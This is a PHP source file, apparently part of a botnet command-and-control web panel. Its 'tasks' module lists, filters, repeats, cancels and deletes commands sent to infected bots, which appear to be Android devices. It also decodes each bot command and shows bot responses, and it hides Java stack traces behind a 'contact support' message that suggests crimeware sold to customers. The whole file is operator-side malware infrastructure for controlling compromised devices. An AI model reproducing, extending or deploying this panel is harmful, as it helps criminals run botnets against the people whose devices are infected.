<?php
require_once "cmd_mod.php";

class tasks extends modBase
{
	protected $module_name = 'tasks';

	function get_filter()
	{
		$status_filter = hlp::get($this->filter_values, 'status', '');
		if(!array_key_exists($status_filter, hlp::$tasks_statuses))
			$status_filter = '';
			
		unset($this->filter_values['status']);
		
		$options = '';
		foreach(hlp::$tasks_statuses as $key=>$title)
		{
			$title = strip_tags($title);
			$checked = ($key == $status_filter)? " checked " : "";
			$options .= "<option value='{$key}' {$checked}>{$title}</option>";
		}
		
		$status_list = <<<PHP
<div class="col-md-2">
	<select id="tasks-filter-status" class="form-control" onchange="apply_filter()">
		<option value=''>All</option>
		{$options}
	</select>
</div>
PHP;

		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			array('bot_id', 'Bot ID', 'Bot ID'),
			array('Status', $status_list),
		);
		
		return $this->build_filter($fields);
	}
	
	// response json in string from db.tasks
	function format_response($response, $task_id)
	{
		if(strstr($response, ".java:") || strstr($response, "DexPathList"))
			return <<<PHP
	<span style='color: darkred' ondblclick='$("#details{$task_id}").show()'>Error code: M{$task_id}, contact support</span>
	<textarea id='details{$task_id}' class='form-control' style='display: none; height: 200px; font-size: 9pt'>{$response}</textarea>
PHP;

		return $response;
	}
	
	function get_content()
	{
		$fields = 'id, bot_id, command, status, response, ts_start, ts_end';
		$sql = "select %FIELDS% from bot_tasks";

		$sql = $this->addWhere($sql, $this->filter_values, array('bot_id'));
		$sql .= " order by `ts_start` desc";
		
		// count request
		$total_rows = $this->db->exec(str_replace('%FIELDS%', 'count(bot_tasks.id)', $sql), null, true)[0][0];

		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= $paging['sql'];

		// data request
		$data = $this->db->exec(str_replace('%FIELDS%', $fields, $sql), null, true);
		
		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;tasks-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all"></span></a>';
		$headers[] = 'Bot';
		$headers[] = 'Command';
		$headers[] = 'Status';
		$headers[] = 'Response';
		$headers[] = 'Started at';
		$headers[] = 'Finished at';
		$headers[] = 'Action';

		$rows = array();
		foreach($data as $row)
		{
			$tmp = array();

			$tmp[] = "<label class='checkbox' for='tasks-table-chk-{$row['id']}'>
					<input type='checkbox' value='{$row['id']}' id='tasks-table-chk-{$row['id']}' data-toggle='checkbox' />
				</label>";

			$tmp[] = "<a onmouseout='hide_bot_details()' onmouseover='show_bot_details(this, \"{$row['bot_id']}\")' href='#page:menu-bot;bot_id={$row['bot_id']}'>Details</a>";
			$tmp[] = $this->format_task($row['command']);
			$tmp[] = hlp::$tasks_statuses[$row['status']];
			$tmp[] = $this->format_response($row['response'], $row['id']);
			$tmp[] = hlp::human_date($row['ts_start']);
			$tmp[] = ($row['ts_end'])? hlp::human_date($row['ts_end']) : "<i style='color: darkred'>&#151;</i>";
			
			$actions = '';
			if($row['status'] == 'pending')
				$actions = <<<PHP
				<button type='button' class='btn btn-warning' onclick='show_ajax_form("panel_cancel_task", [{$row['id']}])'>Cancel</button>
PHP;
			else if($row['status'] == 'in_work')
				$actions = "";
			else
				$actions = <<<PHP
				<button type='button' class='btn btn-info' onclick='show_ajax_form("panel_repeat_task", [{$row['id']}])'>Repeat</button>
PHP;
			
			$actions .= <<<PHP
				<button type='button' class='btn btn-danger' onclick='show_ajax_form("panel_delete_task", [{$row['id']}])'>Delete</button>
PHP;

			$tmp[] = $actions;
			$rows[] = $tmp;
		}

		$content = $this->get_table($rows, $headers, 'textcenter');

		$buttons = array(
			array('Cancel', 'Cancel selected tasks', 'show_ajax_form("panel_cancel_task")', 'warning'),
			array('Repeat', 'Repeat selected tasks', 'show_ajax_form("panel_repeat_task")', 'info'),
			array('Delete', 'Delete selected tasks', 'show_ajax_form("panel_delete_task")', 'danger'),
		);
		
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}
	
	function format_task($command_json)
	{
		
		if(!trim($command_json))
			return '';
		
		$data = json_decode($command_json, true);
		if($data === false)
			return "<i style='color: darkred'>Task can not be displayed</i>";
		
		$cmd = '';
		foreach(Commands::$cmd as $command=>$details)
		{
			if($data['mn'] == $details['bot_cmd'])
			{
				$text = $details['name'];
				//~ d($command . $details['bot_cmd']);
				if(hlp::endsWith($command, '_off'))
					$text = " Disable: " . $text;
				elseif(hlp::endsWith($command, '_on'))
					$text = " Enable: " . $text;
					
				$desc = strip_tags(str_replace("<br />", "; ", $details['descr']));
				$cmd = "<center><i style='color: darkred' title='{$desc}'>{$text}</i></center>";
				break;
			}
		}

		if($data['p'])
		{
			if(is_array($data['p']) && sizeof($data['p']) == 1)
			{
				foreach($data['p'] as $k=>$v)
					$param_text = $v;
					
				$cmd .= "<i style='font-size: 11pt;'>Parameter: <span style='color: darkblue'>{$param_text}</span></i>";
			}elseif(is_array($data['p']))
			{
				$params_text = '';
				foreach($data['p'] as $k=>$v)
				{
					if(!trim($v))
						$v = '""';
						
					if(strlen($v) > 30)
						$v = mb_substr($v, 0, 30, "utf-8") . "...";
						
					$params_text .= "&#151; {$v}<br />";
				}
				
				$cmd .= "<i style='font-size: 11pt'>Parameters:<br /><span style='color: darkblue'>{$params_text}</span></i>";
			}
		}

		return "<div style='text-align: left'>{$cmd}</div>";
	}

}
